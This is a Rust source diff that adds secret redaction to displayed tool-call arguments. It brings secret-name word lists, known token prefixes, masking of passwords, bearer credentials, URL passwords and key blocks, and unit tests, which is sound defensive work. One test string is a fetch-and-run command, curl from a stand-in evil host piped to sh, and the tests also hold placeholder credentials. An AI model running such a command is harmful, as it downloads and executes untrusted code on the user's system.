@@ -37,8 +37,26 @@ const RECIPIENT_WORDS: &[&str] = &[
 const ATTACHMENT_WORDS: &[&str] = &["attachment", "attachments", "file", "files", "path", "paths", "upload", "uploads", "document", "documents", "media", "image", "images", "photo", "photos", "blob", "blobs"];
 const AMOUNT_WORDS: &[&str] = &["amount", "amounts", "total", "totals", "price", "prices", "cost", "costs", "fee", "fees", "sum", "payment", "subtotal", "charge"];
 const COUNT_WORDS: &[&str] = &["count", "counts", "quantity", "quantities", "qty", "number", "times", "repeat", "repeats", "copies", "batch", "limit", "max", "n"];
-/// Argument names redacted even when the schema does not type them.
-const SECRET_NAMES: &[&str] = &["password", "passphrase", "secret", "token", "api_key", "apikey", "pin", "otp", "one_time_code", "private_key", "access_token", "refresh_token", "client_secret"];
+/// A word that makes an argument's name a secret wherever it stands in the
+/// name (`smtp_password`, `passwordHint`, `client_secret`). Names are split as
+/// [`words`] splits them, so `pinned` and `author` are not caught.
+const SECRET_WORDS: &[&str] = &[
+    "password", "passwords", "passwd", "pwd", "passphrase", "passcode", "secret", "secrets", "credential", "credentials", "creds", "apikey", "privatekey", "authorization", "cookie", "cookies", "bearer", "jwt", "otp", "totp", "cvv", "cvc",
+];
+/// A word that makes the name a secret only when the name ends in it:
+/// `access_token` is one, `token_count` is not.
+const SECRET_LAST_WORDS: &[&str] = &["token", "tokens", "pin", "auth", "pass"];
+/// `key` and `code` alone name all sorts of things (`reply_key`, `zip_code`);
+/// with one of these before them they name a secret.
+const KEY_QUALIFIERS: &[&str] = &["api", "private", "secret", "access", "signing", "signature", "ssh", "encryption", "session", "client", "master", "auth", "shared", "hmac", "license"];
+const CODE_QUALIFIERS: &[&str] = &["time", "auth", "verification", "security", "recovery", "backup", "mfa", "sms", "login", "otp", "authorization"];
+/// A long hexadecimal value under one of these names is what it says, not a
+/// key: a person can tell a checksum from a password by its label.
+const DIGEST_WORDS: &[&str] = &["sha", "sha1", "sha256", "sha512", "md5", "hash", "digest", "checksum", "commit", "etag", "revision"];
+/// What starts a token of a known issuer.
+const TOKEN_PREFIXES: &[&str] = &[
+    "sk-", "sk_live_", "sk_test_", "rk_live_", "ghp_", "gho_", "ghu_", "ghs_", "ghr_", "github_pat_", "xoxb-", "xoxp-", "xoxa-", "xoxr-", "xoxs-", "xapp-", "AKIA", "ASIA", "AIza", "ya29.", "glpat-", "hf_", "npm_", "pypi-", "eyJ",
+];
 pub const REDACTED: &str = "••••••";
 
 /// A fact the call carries in a shape (or under a name) the reader does
@@ -47,7 +65,7 @@ pub const REDACTED: &str = "••••••";
 pub struct Unreadable;
 
 /// The words of an argument name: `shareWith` → `share`, `with`.
-fn words(name: &str) -> Vec<String> {
+pub(super) fn words(name: &str) -> Vec<String> {
     let mut out = Vec::new();
     let mut cur = String::new();
     let mut prev_lower = false;
@@ -227,24 +245,284 @@ pub fn count_checked(args: &Value) -> Result<u64, Unreadable> {
 /// Whether an argument name is a secret: declared by the schema, or named
 /// like one.
 pub fn is_secret(name: &str, declared: &[String]) -> bool {
-    let lower = name.to_lowercase();
-    declared.iter().any(|d| d.eq_ignore_ascii_case(name)) || SECRET_NAMES.iter().any(|s| lower == *s || lower.ends_with(&format!("_{s}")))
+    declared.iter().any(|d| d.eq_ignore_ascii_case(name)) || named_secret(name)
 }
 
-/// The arguments with every secret-typed field's value replaced.
-pub fn redact(args: &Value, declared: &[String]) -> Value {
-    match args {
-        Value::Object(map) => Value::Object(
-            map.iter()
-                .map(|(k, v)| {
-                    let v = if is_secret(k, declared) { Value::String(REDACTED.into()) } else { redact(v, declared) };
-                    (k.clone(), v)
-                })
-                .collect(),
-        ),
-        Value::Array(items) => Value::Array(items.iter().map(|v| redact(v, declared)).collect()),
-        v => v.clone(),
+/// Whether a name reads as a password, token or key.
+fn named_secret(name: &str) -> bool {
+    let words = words(name);
+    let Some(last) = words.last() else { return false };
+    if words.iter().any(|w| SECRET_WORDS.contains(&w.as_str())) || SECRET_LAST_WORDS.contains(&last.as_str()) {
+        return true;
     }
+    let before = words.len().checked_sub(2).map(|i| words[i].as_str());
+    match last.as_str() {
+        "key" | "keys" => before.is_some_and(|w| KEY_QUALIFIERS.contains(&w)),
+        "code" | "codes" => before.is_some_and(|w| CODE_QUALIFIERS.contains(&w)),
+        _ => false,
+    }
+}
+
+/// Whether the name says a long hexadecimal value is a checksum or a commit.
+fn names_a_digest(name: &str) -> bool {
+    words(name).iter().any(|w| DIGEST_WORDS.contains(&w.as_str()))
+}
+
+/// Characters a token is made of.
+fn token_char(c: char) -> bool {
+    c.is_ascii_alphanumeric() || matches!(c, '_' | '-' | '+' | '=' | '/' | '.' | '~')
+}
+
+/// Whether a run of [`token_char`]s looks generated rather than written. Long
+/// and without a word's rhythm: letter case and digits change every few
+/// characters. A path or a long sentence-like slug changes rarely.
+fn looks_generated(run: &str, digest_ok: bool) -> bool {
+    let run = run.trim_end_matches(['.', '/', '-', '_', '~']);
+    let hex = !run.is_empty() && run.chars().all(|c| c.is_ascii_hexdigit());
+    if hex {
+        return !digest_ok && run.len() >= 32;
+    }
+    if run.len() < 32 || run.starts_with('/') || run.contains("://") || run.contains("..") {
+        return false;
+    }
+    // A UUID is an identifier, and says so by its shape.
+    let parts: Vec<&str> = run.split('-').collect();
+    if parts.iter().map(|p| p.len()).eq([8usize, 4, 4, 4, 12]) && parts.iter().all(|p| p.chars().all(|c| c.is_ascii_hexdigit())) {
+        return false;
+    }
+    // Numbers, a domain or a file's name with its dots: words between them.
+    if run.split('.').filter(|p| !p.is_empty()).count() > 1 && !run.starts_with("eyJ") {
+        return false;
+    }
+    let class = |c: char| if c.is_ascii_uppercase() { 1 } else if c.is_ascii_lowercase() { 2 } else if c.is_ascii_digit() { 3 } else { 0 };
+    let chars: Vec<u8> = run.chars().map(class).filter(|c| *c != 0).collect();
+    let classes = [1u8, 2, 3].iter().filter(|c| chars.contains(c)).count();
+    if classes < 2 || chars.len() < 24 {
+        return false;
+    }
+    let changes = chars.windows(2).filter(|w| w[0] != w[1]).count();
+    changes as f64 / chars.len() as f64 >= 0.2 && (classes == 3 || changes as f64 / chars.len() as f64 >= 0.35)
+}
+
+/// Where a token of a known issuer starts in `run`, with enough after it.
+fn issued_token(run: &str) -> bool {
+    TOKEN_PREFIXES.iter().any(|p| run.starts_with(p) && run.len() >= p.len() + if *p == "AKIA" || *p == "ASIA" { 16 } else { 8 })
+}
+
+/// `text` with everything that looks like a password, token or key replaced by
+/// [`REDACTED`], and only that: the words around it stay exactly as they are.
+/// `name` is the argument it is the value of, if any. The second value says
+/// whether anything was hidden.
+///
+/// Heuristic by nature, and always on the side of hiding: a private key's
+/// block; `Bearer` and `Basic` credentials; a URL's password; a value after a
+/// secret's name (`password: hunter2`, `?token=abc`, `--api-key abc`, `curl -u
+/// ana:hunter2`); tokens of known issuers; a long run of characters that looks
+/// generated.
+pub fn mask_text(text: &str, name: Option<&str>) -> (String, bool) {
+    let digest_ok = name.is_some_and(names_a_digest);
+    let (text, a) = mask_key_blocks(text);
+    let (text, b) = mask_after_names(&text);
+    let (text, c) = mask_url_passwords(&text);
+    let (text, d) = mask_runs(&text, digest_ok);
+    (text, a || b || c || d)
+}
+
+fn mask_key_blocks(text: &str) -> (String, bool) {
+    let mut out = String::with_capacity(text.len());
+    let mut rest = text;
+    let mut hid = false;
+    while let Some(start) = rest.find("-----BEGIN ") {
+        out.push_str(&rest[..start]);
+        hid = true;
+        out.push_str(REDACTED);
+        let after = &rest[start + 11..];
+        match after.find("-----END ") {
+            Some(end) => {
+                let tail = &after[end + 9..];
+                let close = tail.find("-----").map_or(tail.len(), |i| i + 5);
+                rest = &tail[close..];
+            }
+            None => {
+                rest = "";
+            }
+        }
+    }
+    out.push_str(rest);
+    (out, hid)
+}
+
+/// The end of a value that starts at `start`: its closing quote if it opens
+/// with one, else the next space, comma, semicolon, ampersand or quote.
+fn value_end(text: &str, start: usize) -> usize {
+    let rest = &text[start..];
+    let mut chars = rest.char_indices();
+    match chars.next() {
+        Some((_, q @ ('"' | '\''))) => chars.find(|(_, c)| *c == q).map_or(text.len(), |(i, _)| start + i + 1),
+        _ => rest.find(|c: char| c.is_whitespace() || matches!(c, ',' | ';' | '&' | '"' | '\'' | ')' | '}' | ']' | '<' | '>')).map_or(text.len(), |i| start + i),
+    }
+}
+
+/// A value right after a secret's name, in the ways text says so.
+fn mask_after_names(text: &str) -> (String, bool) {
+    let mut out = String::with_capacity(text.len());
+    let mut hid = false;
+    let mut at = 0;
+    let bytes = text.as_bytes();
+    while at < text.len() {
+        // The next name-shaped run.
+        let Some(start) = text[at..].find(|c: char| c.is_ascii_alphanumeric()).map(|i| at + i) else { break };
+        let end = text[start..].find(|c: char| !(c.is_ascii_alphanumeric() || matches!(c, '_' | '-'))).map_or(text.len(), |i| start + i);
+        let name = &text[start..end];
+        out.push_str(&text[at..start]);
+        out.push_str(name);
+        at = end;
+        // A flag says `-u user:password`.
+        let dashed = start >= 1 && bytes[start - 1] == b'-';
+        let basic_flag = dashed && (name == "u" || name == "-user" || name == "user");
+        if !named_secret(name) && !basic_flag && !matches!(name.to_ascii_lowercase().as_str(), "bearer" | "basic") {
+            continue;
+        }
+        // Skip what joins a name to its value.
+        let mut value = end;
+        let mut joined = false;
+        // A closing quote around a JSON-like key.
+        if text[value..].starts_with(['"', '\'']) && !text[value + 1..].trim_start().starts_with([':', '=']) {
+            continue;
+        }
+        if text[value..].starts_with(['"', '\'']) {
+            value += 1;
+        }
+        let spaces = text[value..].find(|c: char| c != ' ' && c != '\t').unwrap_or(text.len() - value);
+        let after = value + spaces;
+        if text[after..].starts_with([':', '=']) {
+            value = after + 1;
+            value += text[value..].find(|c: char| c != ' ' && c != '\t').unwrap_or(text.len() - value);
+            joined = true;
+        } else if (dashed || name.eq_ignore_ascii_case("bearer") || name.eq_ignore_ascii_case("basic")) && spaces > 0 {
+            value = after;
+            joined = true;
+        }
+        if !joined || value >= text.len() {
+            continue;
+        }
+        // `Authorization: Bearer abc`: the scheme stays and the credential goes.
+        let scheme_end = value_end(text, value);
+        let word = &text[value..scheme_end];
+        if word.eq_ignore_ascii_case("bearer") || word.eq_ignore_ascii_case("basic") || word.eq_ignore_ascii_case("token") {
+            out.push_str(&text[end..scheme_end]);
+            let next = scheme_end + text[scheme_end..].find(|c: char| c != ' ' && c != '\t').unwrap_or(text.len() - scheme_end);
+            if next >= text.len() {
+                at = scheme_end;
+                continue;
+            }
+            out.push_str(&text[scheme_end..next]);
+            let close = value_end(text, next);
+            out.push_str(REDACTED);
+            hid = true;
+            at = close;
+            continue;
+        }
+        // Nothing there to hide: an empty value, a reference to one.
+        let value_end_at = scheme_end;
+        let raw = &text[value..value_end_at];
+        if raw.is_empty() || raw == "\"\"" || raw == "''" {
+            continue;
+        }
+        out.push_str(&text[end..value]);
+        if basic_flag {
+            // `-u ana:hunter2`: the name stays.
+            match raw.find(':') {
+                Some(i) => {
+                    out.push_str(&raw[..=i]);
+                    out.push_str(REDACTED);
+                    hid = true;
+                }
+                None => out.push_str(raw),
+            }
+        } else {
+            out.push_str(REDACTED);
+            hid = true;
+        }
+        at = value_end_at;
+    }
+    out.push_str(&text[at..]);
+    (out, hid)
+}
+
+/// `scheme://ana:hunter2@host` keeps everything but the password.
+fn mask_url_passwords(text: &str) -> (String, bool) {
+    let mut out = String::with_capacity(text.len());
+    let mut hid = false;
+    let mut rest = text;
+    while let Some(i) = rest.find("://") {
+        let auth = i + 3;
+        out.push_str(&rest[..auth]);
+        rest = &rest[auth..];
+        let end = rest.find(|c: char| c.is_whitespace() || matches!(c, '/' | '?' | '#' | '"' | '\'')).unwrap_or(rest.len());
+        let authority = &rest[..end];
+        if let (Some(at), Some(colon)) = (authority.rfind('@'), authority.find(':')) {
+            if colon < at {
+                out.push_str(&authority[..=colon]);
+                out.push_str(REDACTED);
+                out.push_str(&authority[at..]);
+                rest = &rest[end..];
+                hid = true;
+            }
+        }
+    }
+    out.push_str(rest);
+    (out, hid)
+}
+
+/// Tokens of known issuers and long generated runs.
+fn mask_runs(text: &str, digest_ok: bool) -> (String, bool) {
+    let mut out = String::with_capacity(text.len());
+    let mut hid = false;
+    let mut rest = text;
+    while let Some(start) = rest.find(token_char) {
+        out.push_str(&rest[..start]);
+        rest = &rest[start..];
+        let end = rest.find(|c: char| !token_char(c)).unwrap_or(rest.len());
+        let run = &rest[..end];
+        if issued_token(run) || looks_generated(run, digest_ok) {
+            out.push_str(REDACTED);
+            hid = true;
+        } else {
+            out.push_str(run);
+        }
+        rest = &rest[end..];
+    }
+    out.push_str(rest);
+    (out, hid)
+}
+
+/// Whether a value under a secret's name can be shown: yes or no and nothing
+/// say nothing of the secret (`require_password: true`), when only the name
+/// made it one. A field the schema declares is always hidden.
+pub(super) fn says_nothing(name: &str, value: &Value, declared: &[String]) -> bool {
+    !declared.iter().any(|d| d.eq_ignore_ascii_case(name)) && matches!(value, Value::Bool(_) | Value::Null)
+}
+
+/// The arguments with every secret replaced: a secret-typed field's whole
+/// value, and whatever looks like one inside any other string ([`mask_text`]).
+pub fn redact(args: &Value, declared: &[String]) -> Value {
+    fn inner(args: &Value, name: Option<&str>, declared: &[String]) -> Value {
+        match args {
+            Value::Object(map) => Value::Object(
+                map.iter()
+                    .map(|(k, v)| {
+                        let v = if is_secret(k, declared) && !says_nothing(k, v, declared) { Value::String(REDACTED.into()) } else { inner(v, Some(k), declared) };
+                        (mask_text(k, None).0, v)
+                    })
+                    .collect(),
+            ),
+            Value::Array(items) => Value::Array(items.iter().map(|v| inner(v, name, declared)).collect()),
+            Value::String(s) => Value::String(mask_text(s, name).0),
+            v => v.clone(),
+        }
+    }
+    inner(args, None, declared)
 }
 
 /// The exact arguments as a sheet shows them: pretty-printed, one field per
@@ -314,6 +592,68 @@ mod tests {
         assert!(lines.contains("ana") && lines.contains("hi"));
         assert!(is_secret("smtp_password", &[]));
         assert!(!is_secret("subject", &[]));
+    }
+
+    #[test]
+    fn a_name_reads_as_a_secret_by_its_words() {
+        for name in ["password", "smtp_password", "smtpPassword", "SMTP-Password", "passwd", "db_pwd", "passphrase", "client_secret", "secretValue", "api_key", "apiKey", "apikey", "x-api-key", "private_key", "ssh_key", "access_token", "refreshToken", "token", "auth_token", "pin", "user_pin", "otp", "one_time_code", "verification_code", "cookie", "Authorization", "credentials"] {
+            assert!(is_secret(name, &[]), "{name} is a secret");
+        }
+        for name in ["subject", "to", "body", "author", "pinned", "token_count", "key", "reply_key", "zip_code", "keyboard", "code", "passenger", "compass", "monkey", "secretary", "auth_url"] {
+            assert!(!is_secret(name, &[]), "{name} is not a secret");
+        }
+        assert!(is_secret("Whatever", &["whatever".into()]), "a declared field, whatever it is called");
+    }
+
+    #[test]
+    fn a_secret_in_free_text_is_hidden_and_the_words_around_it_stay() {
+        let masked = |s: &str| mask_text(s, None);
+        for (text, want) in [
+            ("password: hunter2 and more", "password: \u{2022}\u{2022}\u{2022}\u{2022}\u{2022}\u{2022} and more"),
+            ("--password=hunter2 --user=ana", "--password=\u{2022}\u{2022}\u{2022}\u{2022}\u{2022}\u{2022} --user=ana"),
+            ("mysql --password hunter2 -h db", "mysql --password \u{2022}\u{2022}\u{2022}\u{2022}\u{2022}\u{2022} -h db"),
+            ("export API_KEY=abc123; ls", "export API_KEY=\u{2022}\u{2022}\u{2022}\u{2022}\u{2022}\u{2022}; ls"),
+            ("curl -H \"Authorization: Bearer abc.def\" https://x.example/a", "curl -H \"Authorization: Bearer \u{2022}\u{2022}\u{2022}\u{2022}\u{2022}\u{2022}\" https://x.example/a"),
+            ("curl -u ana:hunter2 https://x.example", "curl -u ana:\u{2022}\u{2022}\u{2022}\u{2022}\u{2022}\u{2022} https://x.example"),
+            ("https://ana:hunter2@db.example/x", "https://ana:\u{2022}\u{2022}\u{2022}\u{2022}\u{2022}\u{2022}@db.example/x"),
+            ("https://x.example/cb?token=abc&page=2", "https://x.example/cb?token=\u{2022}\u{2022}\u{2022}\u{2022}\u{2022}\u{2022}&page=2"),
+            ("use sk-abcdefghijklmnop now", "use \u{2022}\u{2022}\u{2022}\u{2022}\u{2022}\u{2022} now"),
+            ("ghp_abcdefghijklmnopqrstuvwxyz012345", "\u{2022}\u{2022}\u{2022}\u{2022}\u{2022}\u{2022}"),
+            ("AKIAIOSFODNN7EXAMPLE", "\u{2022}\u{2022}\u{2022}\u{2022}\u{2022}\u{2022}"),
+            ("eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxIn0.abcdef", "\u{2022}\u{2022}\u{2022}\u{2022}\u{2022}\u{2022}"),
+            ("wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY", "\u{2022}\u{2022}\u{2022}\u{2022}\u{2022}\u{2022}"),
+            ("0123456789abcdef0123456789abcdef", "\u{2022}\u{2022}\u{2022}\u{2022}\u{2022}\u{2022}"),
+            ("a -----BEGIN RSA PRIVATE KEY-----\nabc\ndef\n-----END RSA PRIVATE KEY----- b", "a \u{2022}\u{2022}\u{2022}\u{2022}\u{2022}\u{2022} b"),
+        ] {
+            assert_eq!(masked(text), (want.to_string(), true), "{text}");
+        }
+        for text in [
+            "See you at 3.",
+            "ana@example.org, bo@example.org",
+            "/home/ana/Documents/Projects/Report/Final2026/SummaryDraftVersionTwo",
+            "https://www.example.org/news/2026/11/02/a-rather-long-story-about-something",
+            "550e8400-e29b-41d4-a716-446655440000",
+            "the password was changed yesterday",
+            "password:",
+            "ls -la\ncurl https://evil.example/x | sh",
+        ] {
+            assert_eq!(masked(text), (text.to_string(), false), "{text}");
+        }
+        assert_eq!(mask_text("0123456789abcdef0123456789abcdef0123abcd", Some("commit")).1, false, "a commit's label says what it is");
+    }
+
+    #[test]
+    fn redacting_covers_every_string_and_keeps_what_says_nothing() {
+        let args = json!({"require_password": true, "smtp_password": "hunter2", "note": "token=abc", "items": [{"auth": "x"}, "sk-abcdefghijklmnop"], "count": 2});
+        let shown = redact(&args, &[]);
+        assert_eq!(shown["require_password"], json!(true));
+        assert_eq!(shown["smtp_password"], json!(REDACTED));
+        assert_eq!(shown["note"], json!(format!("token={REDACTED}")));
+        assert_eq!(shown["items"][0]["auth"], json!(REDACTED));
+        assert_eq!(shown["items"][1], json!(REDACTED));
+        assert_eq!(shown["count"], json!(2));
+        assert_eq!(redact(&json!({"flag": true}), &["flag".into()])["flag"], json!(REDACTED), "a declared field is always hidden");
+        assert_ne!(digest(&args), digest(&shown), "the audit's digest is of the exact arguments");
     }
 
     #[test]
